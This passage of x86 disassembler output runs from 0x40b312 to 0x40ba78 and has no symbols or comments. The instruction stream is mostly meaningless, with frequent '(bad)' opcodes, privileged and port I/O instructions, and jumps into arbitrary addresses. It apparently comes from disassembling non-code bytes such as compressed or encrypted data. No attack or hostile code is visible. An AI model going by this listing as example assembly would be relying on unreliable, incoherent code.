  40b312:	jne    0x40b383
  40b314:	xchg   esp,eax
  40b315:	scas   eax,DWORD PTR es:[edi]
  40b316:	lea    edx,[ebx-0x22]
  40b319:	rcr    DWORD PTR [ecx-0x13],cl
  40b31c:	sub    ecx,DWORD PTR [ebx+edx*4]
  40b31f:	fs pushf 
  40b321:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b322:	dec    eax
  40b323:	aas    
  40b324:	sub    eax,0x754f8512
  40b329:	iret   
  40b32a:	add    esi,DWORD PTR [esi]
  40b32c:	cli    
  40b32d:	and    al,0x82
  40b32f:	mov    BYTE PTR [ebx+esi*4-0x31f00d51],ah
  40b336:	int    0x38
  40b338:	retf   
  40b339:	xchg   edx,eax
  40b33a:	mov    dl,0x21
  40b33c:	or     al,0xdd
  40b33f:	xor    al,0x6b
  40b341:	adc    edx,DWORD PTR [eax-0x171e5a46]
  40b347:	xchg   edi,eax
  40b348:	inc    ebp
  40b349:	bound  eax,QWORD PTR [eax+0x139d5118]
  40b34f:	push   esp
  40b350:	dec    esp
  40b351:	ret    0xaa00
  40b354:	sar    DWORD PTR [esi-0x489483dd],cl
  40b35a:	mov    dh,0xf0
  40b35c:	scas   al,BYTE PTR es:[edi]
  40b35d:	lods   eax,DWORD PTR ds:[esi]
  40b35e:	push   esp
  40b35f:	push   0xb7261d31
  40b364:	jecxz  0x40b37a
  40b366:	ret    0xd074
  40b369:	mov    ah,0xa1
  40b36b:	rcr    ecx,cl
  40b36d:	repz push ecx
  40b36f:	fldenv [ebx-0x1b]
  40b372:	mov    eax,ds:0x69ee59ab
  40b377:	sub    eax,0x60bb2970
  40b37c:	fidivr WORD PTR [ecx+0x7c]
  40b37f:	sbb    dl,BYTE PTR [edi]
  40b381:	in     eax,0x8b
  40b383:	sbb    al,BYTE PTR [edi-0x779331ea]
  40b389:	or     esi,DWORD PTR [eax-0x4b80ac67]
  40b38f:	pusha  
  40b390:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b391:	push   cs
  40b392:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b393:	call   0xb534:0xf68e4874
  40b39a:	pushf  
  40b39b:	addr16 cdq 
  40b39d:	sbb    dh,BYTE PTR [eax+0x4a]
  40b3a0:	sub    bl,BYTE PTR [ecx-0x51]
  40b3a3:	and    bl,cl
  40b3a5:	xchg   esi,eax
  40b3a6:	daa    
  40b3a7:	dec    esi
  40b3a8:	and    eax,0x900e60c
  40b3ad:	inc    ebx
  40b3ae:	(bad)  
  40b3af:	jl     0x40b3a5
  40b3b1:	cmp    BYTE PTR ds:0x98d10bc,0xf6
  40b3b8:	popa   
  40b3b9:	sbb    DWORD PTR [ebx+0x1c],edi
  40b3bc:	mov    bh,cl
  40b3be:	pop    esi
  40b3bf:	mov    cl,0xee
  40b3c1:	popf   
  40b3c2:	stc    
  40b3c3:	adc    esi,ebp
  40b3c5:	imul   esp,edx,0xffffffb1
  40b3c8:	push   ss
  40b3c9:	mov    cl,0xb6
  40b3cb:	in     eax,dx
  40b3cc:	push   ecx
  40b3cd:	rcl    BYTE PTR [ebp+0x3d],1
  40b3d0:	loop   0x40b3fc
  40b3d2:	cmp    esp,DWORD PTR [ebp+0x3adf5b]
  40b3d8:	xchg   edx,eax
  40b3d9:	pop    edx
  40b3da:	pop    ss
  40b3db:	ins    DWORD PTR es:[edi],dx
  40b3dc:	adc    eax,edi
  40b3de:	imul   ebp,DWORD PTR [edx+0x62],0x3a
  40b3e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3e3:	add    edx,DWORD PTR [esi+0x48b9fa63]
  40b3e9:	outs   dx,DWORD PTR ds:[esi]
  40b3ea:	retf   
  40b3eb:	xor    eax,0x41e09693
  40b3f0:	test   eax,0x7ff8cb54
  40b3f5:	xor    bh,cl
  40b3f7:	inc    edi
  40b3f8:	jmp    0x40b385
  40b3fa:	jmp    0x86a:0xcf8c96b3
  40b401:	das    
  40b402:	cmc    
  40b403:	std    
  40b404:	scas   eax,DWORD PTR es:[edi]
  40b405:	pop    esp
  40b406:	stos   BYTE PTR es:[edi],al
  40b407:	loope  0x40b3c3
  40b409:	(bad)  
  40b40a:	in     al,dx
  40b40b:	jmp    0x40b3cb
  40b40d:	mov    edi,0x4acfbee8
  40b412:	xor    eax,0x85419a04
  40b417:	rcr    ah,0x9f
  40b41a:	jmp    0xf63f2452
  40b41f:	xchg   ecx,eax
  40b420:	or     al,BYTE PTR [ebp+0x2a25ff50]
  40b426:	inc    ebx
  40b427:	cmp    ah,al
  40b429:	lock pop ecx
  40b42b:	add    BYTE PTR [ecx+0x75a6c487],ch
  40b431:	jbe    0x40b3ce
  40b433:	add    eax,DWORD PTR [ecx+0x72]
  40b436:	adc    al,BYTE PTR [ebx+0x59a205af]
  40b43c:	pop    eax
  40b43d:	fsub   QWORD PTR [eax-0x1a]
  40b440:	xchg   bh,cl
  40b442:	call   DWORD PTR [eax+0x78d6781b]
  40b448:	sbb    al,0xf6
  40b44a:	jae    0x40b464
  40b44c:	cmp    esi,edi
  40b44e:	sub    ebx,ecx
  40b450:	ds popf 
  40b452:	or     al,0xba
  40b454:	xchg   BYTE PTR [ebx],dl
  40b456:	dec    esp
  40b458:	bound  edx,QWORD PTR [esi]
  40b45a:	pop    ebx
  40b45b:	cwde   
  40b45c:	call   0x6348:0x2ae43310
  40b463:	adc    bl,bl
  40b465:	inc    edx
  40b466:	jb     0x40b4ba
  40b468:	test   eax,0xa044ca08
  40b46d:	sahf   
  40b46e:	shl    BYTE PTR [esi+0xe],1
  40b471:	out    dx,al
  40b472:	imul   ebx,DWORD PTR ds:0xa4acb744,0xf1f4a386
  40b47c:	scas   eax,DWORD PTR es:[edi]
  40b47d:	inc    esp
  40b47e:	retf   0xca9e
  40b481:	xchg   edx,eax
  40b482:	push   eax
  40b483:	fild   DWORD PTR [ebp-0x1e695a37]
  40b489:	or     bl,BYTE PTR [esi+edi*8+0x98517f2]
  40b490:	pop    esi
  40b491:	ret    0xe923
  40b494:	push   ebx
  40b495:	and    al,0x9a
  40b497:	mov    bl,0x65
  40b499:	add    al,0x43
  40b49b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b49c:	pop    edi
  40b49d:	in     eax,dx
  40b49e:	xor    cl,ch
  40b4a0:	imul   ebp,DWORD PTR [esi+0x1d],0xffffffc3
  40b4a4:	mov    ebx,0xc6c7789
  40b4a9:	sub    esp,DWORD PTR [edx]
  40b4ab:	ret    0x274c
  40b4ae:	cwde   
  40b4af:	fcomp  DWORD PTR [ecx]
  40b4b1:	dec    ebp
  40b4b2:	mov    ecx,0x2f093672
  40b4b7:	imul   BYTE PTR [edi+0x2ebf321]
  40b4bd:	xor    al,0x4b
  40b4bf:	les    esi,FWORD PTR [ecx-0xbde40ff]
  40b4c5:	(bad)  [eax+0x7b]
  40b4c8:	sar    BYTE PTR [eax],0x99
  40b4cb:	repnz xchg esp,eax
  40b4cd:	fisttp QWORD PTR [edi+ecx*2]
  40b4d0:	sub    esp,DWORD PTR [eax-0x52aec2ce]
  40b4d6:	add    eax,eax
  40b4d8:	mov    ?,WORD PTR [esi+0x129dea9c]
  40b4de:	shl    DWORD PTR [eax-0x3a607546],1
  40b4e4:	aam    0xd8
  40b4e6:	sti    
  40b4e7:	ss (bad) 
  40b4e9:	out    dx,eax
  40b4ea:	loope  0x40b478
  40b4ec:	stos   DWORD PTR es:[edi],eax
  40b4ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4ee:	mov    dl,0xae
  40b4f0:	jo     0x40b4c5
  40b4f2:	pop    es
  40b4f3:	jl     0x40b53c
  40b4f5:	call   0x2ffd:0x5a955bcd
  40b4fc:	rcl    BYTE PTR [edi],cl
  40b4fe:	fisub  WORD PTR [eax+0x1f]
  40b501:	out    dx,eax
  40b502:	pop    edi
  40b503:	add    eax,0xf22d4922
  40b508:	jae    0x40b4a5
  40b50a:	maskmovq mm5,mm2
  40b50d:	jl     0x40b573
  40b50f:	mov    dh,0x40
  40b511:	gs fcomi st,st(5)
  40b514:	xchg   esi,eax
  40b515:	(bad)  
  40b516:	push   ecx
  40b517:	pop    ebx
  40b518:	or     al,0x26
  40b51a:	xlat   BYTE PTR ds:[ebx]
  40b51b:	daa    
  40b51c:	inc    ebp
  40b51d:	pop    es
  40b51e:	xchg   esi,eax
  40b51f:	addr16 popa 
  40b521:	hlt    
  40b522:	xchg   ebx,eax
  40b523:	outs   dx,BYTE PTR ds:[esi]
  40b524:	test   DWORD PTR [ebp-0x5],edi
  40b527:	out    dx,eax
  40b528:	in     al,0x25
  40b52a:	(bad)  
  40b52b:	pushf  
  40b52c:	cwde   
  40b52d:	mov    ds:0xb818338,al
  40b532:	adc    al,0xb3
  40b534:	add    eax,DWORD PTR [edi+0x2dac3c65]
  40b53a:	mov    edx,0xebe39969
  40b53f:	retf   0x1511
  40b542:	scas   al,BYTE PTR es:[edi]
  40b543:	adc    bh,BYTE PTR [ecx]
  40b545:	popf   
  40b546:	das    
  40b547:	(bad)  
  40b548:	push   edi
  40b549:	lahf   
  40b54a:	ins    BYTE PTR es:[edi],dx
  40b54b:	test   eax,0xb0d04987
  40b550:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b551:	xchg   edi,eax
  40b552:	out    dx,eax
  40b553:	add    al,BYTE PTR [edx+0x25]
  40b556:	push   ebx
  40b557:	cmc    
  40b558:	mov    ds:0x5d40671a,eax
  40b55d:	mov    cl,0xd9
  40b55f:	sub    dl,ah
  40b561:	xchg   edx,eax
  40b562:	into   
  40b563:	xor    al,0xce
  40b565:	and    ecx,0x126ae572
  40b56b:	xor    edx,eax
  40b56d:	or     DWORD PTR ds:0xe6c3413d,0x4d
  40b574:	stos   BYTE PTR es:[edi],al
  40b575:	mov    ds:0x276a6174,eax
  40b57a:	rcl    DWORD PTR [edx+0x2ecdc1e5],0x65
  40b581:	mov    ebx,0x5ee043c6
  40b586:	mov    bh,0x25
  40b588:	jne    0x40b50d
  40b58a:	jo     0x40b598
  40b58c:	mov    ecx,0x374c6c50
  40b591:	pop    ebx
  40b592:	inc    edi
  40b593:	mov    bh,0x50
  40b595:	inc    esp
  40b596:	and    ebx,DWORD PTR [edx]
  40b598:	mov    BYTE PTR [edx],ah
  40b59a:	scas   al,BYTE PTR es:[edi]
  40b59b:	pusha  
  40b59c:	xor    edi,DWORD PTR gs:[eax+0x64a3066a]
  40b5a3:	jmp    0x40b597
  40b5a5:	cmp    eax,0xcea75cce
  40b5aa:	ret    
  40b5ab:	mov    dh,0x79
  40b5ad:	icebp  
  40b5ae:	inc    ebp
  40b5af:	popf   
  40b5b0:	xchg   esi,eax
  40b5b1:	fcmovne st,st(0)
  40b5b3:	jmp    0x40b60e
  40b5b5:	xrelease mov DWORD PTR [edi+0xa77eb02],ecx
  40b5bc:	mov    bh,0xfe
  40b5be:	sbb    BYTE PTR fs:[edx-0x23],bl
  40b5c2:	retf   
  40b5c3:	fsubr  DWORD PTR [ebx+0x189f0f3f]
  40b5c9:	cli    
  40b5ca:	push   edi
  40b5cb:	sub    ecx,DWORD PTR [esi+0x5e27460a]
  40b5d1:	repz sub BYTE PTR [ebx],bh
  40b5d4:	and    al,0xcc
  40b5d6:	test   BYTE PTR [ebp+0x260142d2],ah
  40b5dc:	ficomp DWORD PTR [edx+esi*1+0x15]
  40b5e0:	popf   
  40b5e1:	or     eax,0xd4cec23
  40b5e6:	lock icebp 
  40b5e8:	shr    al,1
  40b5ea:	mov    ecx,0xf3ab7e8c
  40b5ef:	dec    ebp
  40b5f0:	das    
  40b5f1:	xor    dl,BYTE PTR [ecx+0x4e]
  40b5f4:	repz icebp 
  40b5f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5f8:	fsub   QWORD PTR ds:[eax]
  40b5fb:	dec    eax
  40b5fc:	pop    esp
  40b5fd:	stos   DWORD PTR es:[edi],eax
  40b5fe:	xchg   edi,eax
  40b5ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b600:	test   DWORD PTR [edi+edi*8+0x3b904889],esp
  40b607:	(bad)  
  40b608:	push   edx
  40b609:	sbb    ebp,DWORD PTR [edi+ebx*1+0x5c]
  40b60d:	add    al,0x58
  40b60f:	push   ss
  40b610:	nop
  40b611:	mov    ebx,DWORD PTR [eax+0x2c]
  40b614:	mov    ecx,?
  40b616:	sti    
  40b617:	xchg   edi,eax
  40b618:	aam    0xb6
  40b61a:	loope  0x40b5d0
  40b61c:	add    al,0x8e
  40b61e:	aaa    
  40b61f:	dec    edx
  40b620:	mov    WORD PTR [ebp+0x371209a3],cs
  40b626:	add    eax,0x90e64ffe
  40b62b:	in     al,dx
  40b62c:	jmp    0x9bf0f92e
  40b631:	retf   0x7069
  40b634:	das    
  40b635:	push   0xaac9a14e
  40b63a:	ss aam 0xfc
  40b63d:	es das 
  40b63f:	pusha  
  40b640:	adc    DWORD PTR [ebp+0x12e76634],ecx
  40b646:	sbb    BYTE PTR fs:[ebx],ch
  40b649:	(bad)  
  40b64a:	int3   
  40b64b:	jnp    0x40b67d
  40b64d:	data16 adc BYTE PTR [ebx],al
  40b650:	bound  esi,QWORD PTR [edx+esi*2]
  40b653:	clc    
  40b654:	sub    al,0x57
  40b656:	aam    0xa0
  40b658:	jge    0x40b610
  40b65a:	sahf   
  40b65b:	and    esi,DWORD PTR ds:0xae5f23d4
  40b661:	inc    edi
  40b662:	in     eax,dx
  40b663:	push   ebp
  40b664:	hlt    
  40b665:	fdivr  st,st(5)
  40b667:	clc    
  40b668:	fnstcw WORD PTR [ebp-0x379eba79]
  40b66e:	imul   ebx,DWORD PTR [ebp-0x43920bc9],0x75
  40b675:	imul   edx,DWORD PTR [eax-0x4b2ed956],0x24b67ed5
  40b67f:	pop    ebx
  40b680:	pop    edx
  40b681:	cld    
  40b682:	push   es
  40b683:	pop    ebp
  40b684:	cwde   
  40b685:	pop    ds
  40b686:	jge    0x40b63d
  40b688:	xor    al,0x1c
  40b68a:	outs   dx,BYTE PTR ds:[esi]
  40b68b:	jmp    0x1883c767
  40b690:	leave  
  40b691:	push   cs
  40b692:	sbb    ch,bh
  40b694:	pop    eax
  40b695:	cmc    
  40b696:	xor    DWORD PTR cs:[edi],edi
  40b699:	loopne 0x40b66b
  40b69b:	mov    bl,BYTE PTR [edx+0x7b]
  40b69e:	mov    ebp,0x2011a98e
  40b6a3:	pop    edx
  40b6a4:	ret    
  40b6a5:	or     ecx,DWORD PTR [eax-0x3f]
  40b6a8:	sti    
  40b6a9:	adc    al,0xf4
  40b6ab:	mov    ebp,0x3d1c3874
  40b6b0:	add    BYTE PTR [eax],0xb8
  40b6b3:	sbb    eax,0x27236ecd
  40b6b8:	ins    DWORD PTR es:[edi],dx
  40b6b9:	pop    ss
  40b6ba:	cmp    dh,al
  40b6bc:	(bad)  
  40b6be:	and    dl,BYTE PTR [ebp+ebp*1-0x785f6b1]
  40b6c5:	adc    DWORD PTR [ebx-0x39812ae0],esp
  40b6cb:	xor    al,0xa5
  40b6cd:	dec    eax
  40b6ce:	ins    DWORD PTR es:[edi],dx
  40b6cf:	out    dx,eax
  40b6d0:	call   0x20c1:0xdec94089
  40b6d7:	stos   BYTE PTR es:[edi],al
  40b6d8:	sub    eax,0xc4636d54
  40b6dd:	add    ecx,DWORD PTR [esi]
  40b6df:	ds cli 
  40b6e1:	iret   
  40b6e2:	fwait
  40b6e3:	test   BYTE PTR [esi+0x55],al
  40b6e6:	cmp    eax,0xfe95027c
  40b6eb:	jmp    0xbe37:0xca7fba96
  40b6f2:	retf   
  40b6f3:	pop    edi
  40b6f4:	mov    bl,0xd0
  40b6f6:	jmp    0xaf73:0xd9a254f8
  40b6fd:	xor    DWORD PTR [ebp+0x5044c97a],edx
  40b703:	pop    ss
  40b704:	fmul   st,st(6)
  40b706:	adc    eax,0x2102f04f
  40b70b:	iret   
  40b70c:	stos   DWORD PTR es:[edi],eax
  40b70d:	push   ebx
  40b70e:	xchg   esi,eax
  40b70f:	popa   
  40b710:	xchg   ebp,eax
  40b711:	inc    esp
  40b712:	lods   al,BYTE PTR ds:[esi]
  40b713:	jmp    0x40b6f5
  40b715:	inc    ecx
  40b716:	mov    WORD PTR [edi+0x3b],cs
  40b719:	mov    dh,0x5
  40b71b:	popf   
  40b71c:	mov    ds:0xfc4d92f4,al
  40b721:	mov    bl,0x64
  40b723:	or     al,BYTE PTR [ebx]
  40b725:	repz ss aaa 
  40b728:	jno    0x40b6ba
  40b72a:	adc    al,ah
  40b72c:	push   edx
  40b72d:	mov    bh,0xec
  40b72f:	sub    al,0xfe
  40b731:	inc    esi
  40b732:	shl    BYTE PTR [edi+0x3c],0x93
  40b736:	jns    0x40b6c8
  40b738:	(bad)  
  40b739:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b73a:	rcr    DWORD PTR [ebx],1
  40b73c:	mov    dl,0x7d
  40b73e:	enter  0x62d3,0x2b
  40b742:	ficomp DWORD PTR [edx+0x40]
  40b745:	mov    cs,WORD PTR [eax-0x1001bc26]
  40b74b:	adc    BYTE PTR [ebx+0x3fb2ca76],ch
  40b751:	cmp    eax,0xd85df109
  40b756:	cs aas 
  40b758:	mov    ds:0xe8d5030e,al
  40b75d:	dec    bh
  40b75f:	enter  0x85ba,0x94
  40b763:	fisttp DWORD PTR [edi-0x66]
  40b766:	xor    al,0x9c
  40b768:	cmp    BYTE PTR [eax+0x49],0xc8
  40b76c:	add    ah,BYTE PTR [edi]
  40b76e:	fstp   TBYTE PTR [edx+0x76275f0d]
  40b774:	sti    
  40b775:	xor    ch,BYTE PTR [ebx-0x1d]
  40b778:	dec    esi
  40b779:	stos   DWORD PTR es:[edi],eax
  40b77a:	fwait
  40b77b:	rcr    dh,1
  40b77d:	and    al,0xcb
  40b77f:	fistp  WORD PTR [edx-0x2c4fc812]
  40b785:	sbb    eax,0x51e844ca
  40b78a:	xchg   ebp,eax
  40b78b:	je     0x40b7d6
  40b78d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b78e:	ror    BYTE PTR fs:[eax],0x9e
  40b792:	and    BYTE PTR ds:0xe078262e,bh
  40b798:	(bad)  
  40b79a:	call   0x2f73:0x3b30a4b9
  40b7a1:	sub    ah,bl
  40b7a3:	sbb    esi,DWORD PTR [edi+0x648cec18]
  40b7a9:	xor    cl,BYTE PTR [esi+0x77]
  40b7ac:	sub    BYTE PTR [ebx],0x8e
  40b7af:	fwait
  40b7b0:	mov    eax,ds:0x8aeebbdb
  40b7b5:	or     DWORD PTR [edi-0x15127f92],edx
  40b7bb:	or     al,0x31
  40b7bd:	aaa    
  40b7be:	cmp    DWORD PTR [ecx-0x3],edx
  40b7c1:	pusha  
  40b7c2:	clc    
  40b7c3:	in     eax,0x4
  40b7c5:	stos   BYTE PTR es:[edi],al
  40b7c6:	sbb    eax,0x6db99d78
  40b7cb:	shl    BYTE PTR [ecx+0x6f],1
  40b7ce:	ja     0x40b7e9
  40b7d0:	hlt    
  40b7d1:	jmp    0x40b7aa
  40b7d3:	dec    esp
  40b7d4:	xor    dl,bh
  40b7d6:	loopne 0x40b7d4
  40b7d8:	push   cs
  40b7d9:	or     al,0x2b
  40b7db:	jno    0x40b7bd
  40b7dd:	mov    esp,0x64ae0460
  40b7e2:	pop    ebp
  40b7e3:	das    
  40b7e4:	ret    
  40b7e5:	push   es
  40b7e6:	jb     0x40b7bc
  40b7e8:	bound  ecx,QWORD PTR [ecx-0x4c124016]
  40b7ee:	mov    ss,WORD PTR [edx+0x7622069]
  40b7f4:	inc    esi
  40b7f5:	iret   
  40b7f6:	or     edx,DWORD PTR [eax]
  40b7f8:	sub    al,0x2c
  40b7fa:	inc    edx
  40b7fb:	mov    bh,0x54
  40b7fd:	loope  0x40b817
  40b7ff:	push   esp
  40b800:	dec    edi
  40b801:	clc    
  40b802:	sahf   
  40b803:	adc    esp,edx
  40b805:	out    dx,al
  40b806:	arpl   WORD PTR [edi+0x5c],sp
  40b809:	mov    eax,0xc413d03a
  40b80e:	cmp    DWORD PTR [eax],edi
  40b810:	dec    ebx
  40b811:	fmul   st,st(5)
  40b813:	sub    edi,DWORD PTR [eax+0x18]
  40b816:	mov    ah,bl
  40b818:	int    0x7d
  40b81a:	stos   BYTE PTR es:[edi],al
  40b81b:	seta   BYTE PTR [edx]
  40b81e:	push   esp
  40b81f:	das    
  40b820:	push   0xffffffe4
  40b822:	test   eax,0x8186b10b
  40b827:	(bad)
  40b82b:	sbb    BYTE PTR [ecx+0x74],dl
  40b82e:	inc    esp
  40b82f:	stc    
  40b830:	push   ds
  40b831:	loope  0x40b7ea
  40b833:	xor    esi,esi
  40b835:	mov    dh,0xfc
  40b837:	in     eax,0x94
  40b839:	jl     0x40b7dc
  40b83b:	lock xchg esp,eax
  40b83d:	sub    BYTE PTR [edi+0x7373ca14],0x2
  40b844:	aas    
  40b845:	aad    0x7a
  40b847:	xchg   edx,eax
  40b848:	ins    DWORD PTR es:[edi],dx
  40b849:	sbb    BYTE PTR [edi],ah
  40b84b:	loop   0x40b81f
  40b84d:	loopne 0x40b8aa
  40b84f:	mov    dh,0x1b
  40b851:	out    dx,al
  40b852:	cld    
  40b853:	add    al,0xee
  40b855:	(bad)  
  40b856:	stc    
  40b857:	stc    
  40b858:	and    eax,DWORD PTR [ebx-0x78]
  40b85b:	iret   
  40b85c:	repz mov ah,0x8
  40b85f:	popf   
  40b860:	ss aam 0xa8
  40b863:	mov    ?,WORD PTR [edi+0x7f9b3b41]
  40b869:	scas   al,BYTE PTR es:[edi]
  40b86a:	fsubr  st,st(1)
  40b86c:	and    ebp,DWORD PTR [eax+0x44]
  40b86f:	fist   WORD PTR [ebp+0x12]
  40b872:	ret    
  40b873:	dec    ebx
  40b874:	ja     0x40b8eb
  40b876:	and    eax,0x6f2fa3c
  40b87b:	inc    edi
  40b87c:	in     al,dx
  40b87d:	jae    0x40b87c
  40b87f:	dec    ecx
  40b880:	mov    edi,0xa9760ff6
  40b885:	ds xor edi,esi
  40b888:	push   esi
  40b889:	sub    eax,0x35fcd74
  40b88e:	clc    
  40b88f:	daa    
  40b890:	je     0x40b85d
  40b892:	push   esi
  40b893:	inc    esi
  40b894:	or     DWORD PTR [edx],edx
  40b896:	and    al,BYTE PTR [ebp-0x3f66867d]
  40b89c:	pop    es
  40b89d:	dec    eax
  40b89e:	mov    ds:0xeadbeccc,al
  40b8a3:	sub    DWORD PTR [esi-0x10],edx
  40b8a6:	jo     0x40b905
  40b8a8:	adc    al,BYTE PTR [ebx*1+0x44e1d15e]
  40b8af:	mov    esp,0x724d44aa
  40b8b4:	cmc    
  40b8b5:	dec    eax
  40b8b6:	pusha  
  40b8b7:	xchg   esi,eax
  40b8b8:	fucomip st,st(7)
  40b8ba:	rcl    esi,1
  40b8bc:	es sub DWORD PTR ds:[edx-0x14],esi
  40b8c1:	inc    cx
  40b8c3:	ins    DWORD PTR es:[edi],dx
  40b8c4:	mov    cl,0x6a
  40b8c6:	adc    al,0xb9
  40b8c8:	outs   dx,BYTE PTR ds:[esi]
  40b8c9:	ds jno 0x40b8ba
  40b8cc:	push   ecx
  40b8cd:	push   0x33
  40b8cf:	mov    edi,0xa99f0127
  40b8d4:	frstor [ecx-0xfb5358]
  40b8da:	mov    gs,WORD PTR [ecx]
  40b8dc:	test   DWORD PTR [edi+0x39922bf8],edx
  40b8e2:	aam    0xf
  40b8e4:	out    dx,al
  40b8e5:	in     eax,dx
  40b8e6:	sub    eax,0x4251bd82
  40b8eb:	sbb    ch,BYTE PTR [ecx+0x3fd7c818]
  40b8f1:	sub    dl,al
  40b8f3:	pop    ebp
  40b8f4:	push   ecx
  40b8f5:	mov    ch,0x92
  40b8f7:	sbb    ah,bh
  40b8f9:	mov    ?,WORD PTR [edx-0x332ed3c6]
  40b8ff:	dec    edi
  40b900:	dec    esi
  40b901:	jp     0x40b925
  40b903:	hlt    
  40b904:	add    al,0x94
  40b906:	add    DWORD PTR [ecx+0x681326f5],eax
  40b90c:	cld    
  40b90d:	cwde   
  40b90e:	daa    
  40b90f:	or     DWORD PTR ds:[esi+0x5b],eax
  40b913:	xchg   DWORD PTR [eax],ebx
  40b915:	sbb    DWORD PTR [esi],esp
  40b917:	lds    ecx,FWORD PTR [eax*2-0x2b196e67]
  40b91e:	inc    ecx
  40b91f:	es out 0x5e,eax
  40b922:	rol    dh,1
  40b924:	mov    ds:0x55911a1b,al
  40b929:	scas   al,BYTE PTR es:[edi]
  40b92a:	xchg   ecx,eax
  40b92b:	jg     0x40b94c
  40b92d:	lea    edx,[esi+0x1c0a21d8]
  40b933:	adc    dh,BYTE PTR [ebx]
  40b935:	stc    
  40b936:	jns    0x40b982
  40b938:	pop    ebp
  40b939:	pop    esi
  40b93a:	imul   esi,DWORD PTR [ebx-0x29dc6dcc],0xee5ba7a0
  40b944:	jle    0x40b912
  40b946:	or     esp,DWORD PTR [edx+ebx*4+0x6d]
  40b94a:	xchg   ebp,eax
  40b94b:	or     al,0xcd
  40b94d:	and    BYTE PTR [edi-0x7084847f],0xe2
  40b954:	sbb    BYTE PTR [esi],ch
  40b956:	push   ds
  40b957:	and    esp,DWORD PTR [ebp+0x20]
  40b95a:	mov    al,ds:0xf9f00133
  40b95f:	retf   0x4f95
  40b962:	lods   al,BYTE PTR ds:[esi]
  40b963:	push   esi
  40b964:	repz ret 
  40b966:	in     al,0x57
  40b968:	(bad)  
  40b969:	(bad)  
  40b96a:	jmp    0x40b952
  40b96c:	sahf   
  40b96d:	fsub   st(6),st
  40b96f:	and    al,BYTE PTR [eax]
  40b971:	sbb    eax,0xc83f02df
  40b976:	jae    0x40b9d8
  40b978:	gs push edx
  40b97a:	pop    ecx
  40b97b:	lds    edi,FWORD PTR [eax+0x72]
  40b97e:	and    dl,BYTE PTR [ecx+0xf]
  40b981:	iret   
  40b982:	mov    bl,BYTE PTR es:[edi+0x7c87f1c4]
  40b989:	test   eax,0x544990cb
  40b98e:	mov    ecx,0x16e1721d
  40b993:	sar    DWORD PTR [ecx],0x37
  40b996:	hlt    
  40b997:	fwait
  40b998:	pop    edi
  40b999:	mov    ds:0xd399f1be,al
  40b99e:	inc    edx
  40b99f:	or     edi,esi
  40b9a1:	(bad)  
  40b9a2:	cmc    
  40b9a3:	jnp    0x40b955
  40b9a5:	or     eax,0xc37eb008
  40b9aa:	(bad)  
  40b9ab:	jns    0x40b9d4
  40b9ad:	fadd   QWORD PTR [eax-0x36]
  40b9b0:	or     BYTE PTR [edx-0x79],cl
  40b9b3:	inc    esp
  40b9b4:	jno    0x40b98e
  40b9b6:	cmp    ah,BYTE PTR ds:0x306ffccd
  40b9bc:	xor    eax,0x34defd79
  40b9c1:	inc    edi
  40b9c2:	test   eax,0x2c0cfc29
  40b9c7:	adc    al,0xfa
  40b9c9:	mov    ah,dl
  40b9cb:	push   es
  40b9cc:	cmp    al,0x92
  40b9ce:	iret   
  40b9cf:	xor    bl,bh
  40b9d1:	lea    eax,[ecx]
  40b9d3:	inc    ebp
  40b9d4:	int3   
  40b9d5:	(bad)  
  40b9d6:	imul   edi,DWORD PTR [eax],0xffffffa3
  40b9d9:	cld    
  40b9da:	xchg   ecx,eax
  40b9db:	xchg   edi,eax
  40b9dc:	punpckldq mm2,DWORD PTR [eax]
  40b9df:	lods   eax,DWORD PTR ds:[esi]
  40b9e0:	int3   
  40b9e1:	sub    ebx,esi
  40b9e3:	call   0x1a3995c6
  40b9e8:	dec    esi
  40b9e9:	lea    eax,[edx]
  40b9eb:	pusha  
  40b9ec:	test   al,0xf8
  40b9ee:	sbb    dl,BYTE PTR [ebx]
  40b9f0:	xchg   edi,eax
  40b9f1:	mov    bl,0xf8
  40b9f3:	sub    BYTE PTR [esi],ch
  40b9f5:	xchg   BYTE PTR [ebx+ebp*4+0x73],ah
  40b9f9:	pop    eax
  40b9fa:	adc    eax,0x48dcceae
  40b9ff:	jle    0x40b9d7
  40ba01:	or     BYTE PTR [edx-0x1e378a61],al
  40ba07:	(bad)  
  40ba08:	es cmp bp,0xfff3
  40ba0d:	aam    0xa6
  40ba0f:	stc    
  40ba10:	in     eax,0x6f
  40ba12:	sub    eax,0x20cac52d
  40ba17:	and    BYTE PTR [eax],cl
  40ba19:	std    
  40ba1a:	dec    edx
  40ba1b:	mov    edi,0x3924942f
  40ba20:	push   edi
  40ba21:	aad    0x6f
  40ba23:	lock out 0x5e,al
  40ba26:	daa    
  40ba27:	fisubr DWORD PTR [ebx+eiz*4]
  40ba2a:	(bad)  
  40ba2b:	cmp    eax,0xc95f0cd
  40ba30:	fdivp  st(5),st
  40ba32:	jne    0x40ba89
  40ba34:	mov    ebx,0x66b22bc2
  40ba39:	mov    DWORD PTR [ecx-0x75023b6b],esp
  40ba3f:	mov    ch,0x96
  40ba41:	pusha  
  40ba42:	pop    edx
  40ba43:	mov    bl,0x54
  40ba45:	cmp    dh,BYTE PTR [ecx-0x7c]
  40ba48:	mov    al,0xce
  40ba4a:	pop    ebp
  40ba4b:	or     DWORD PTR [ebp-0x39bd532c],ebx
  40ba51:	gs xor eax,0x417ab03a
  40ba57:	fdivr  st(5),st
  40ba59:	aad    0x8f
  40ba5b:	mov    ebx,0xcb3128e9
  40ba60:	or     BYTE PTR [edi-0x60],al
  40ba63:	scas   eax,DWORD PTR es:[edi]
  40ba64:	test   eax,0x1fd9d4c
  40ba69:	mov    dh,0xe4
  40ba6b:	in     eax,0xac
  40ba6d:	adc    eax,0x3f42f199
  40ba72:	fs xor eax,0x9e0ba696
  40ba78:	xchg   esi,eax
